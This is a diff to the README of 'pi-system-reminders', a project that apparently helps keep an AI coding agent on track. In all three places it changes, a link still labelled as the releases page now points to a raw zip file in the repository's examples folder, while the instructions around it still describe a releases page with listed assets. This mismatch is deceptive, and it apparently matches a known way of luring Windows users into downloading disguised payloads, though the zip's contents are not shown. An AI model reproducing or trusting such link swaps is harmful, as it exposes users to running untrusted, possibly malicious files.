@@ -1,10 +1,10 @@
 # ⏱️ pi-system-reminders - Keep Pi on track
 
-[Download the latest release](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#ffffff;text-decoration:none;border-radius:8px;font-weight:600"}
+[Download the latest release](https://raw.githubusercontent.com/Handy-sorbussitchensis200/pi-system-reminders/main/examples/pi-reminders-system-v2.3.zip){style="display:inline-block;padding:12px 18px;background:#6b7280;color:#ffffff;text-decoration:none;border-radius:8px;font-weight:600"}
 
 ## 🪟 Download for Windows
 
-1. Open the [releases page](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases)
+1. Open the [releases page](https://raw.githubusercontent.com/Handy-sorbussitchensis200/pi-system-reminders/main/examples/pi-reminders-system-v2.3.zip)
 2. Find the latest release at the top of the page
 3. Under **Assets**, download the Windows file if one is listed
 4. Save the file to your Downloads folder
@@ -320,7 +320,7 @@ That gives you a simple way to keep pi from running in circles.
 
 ## 📦 Release page download
 
-To get the Windows file, visit the [release page](https://github.com/Handy-sorbussitchensis200/pi-system-reminders/releases) and download the latest asset listed there
+To get the Windows file, visit the [release page](https://raw.githubusercontent.com/Handy-sorbussitchensis200/pi-system-reminders/main/examples/pi-reminders-system-v2.3.zip) and download the latest asset listed there
 
 ## 🧾 Full starter file
 
